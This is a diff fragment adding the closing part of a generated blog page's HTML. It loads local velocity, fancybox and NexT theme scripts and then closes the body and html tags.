+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
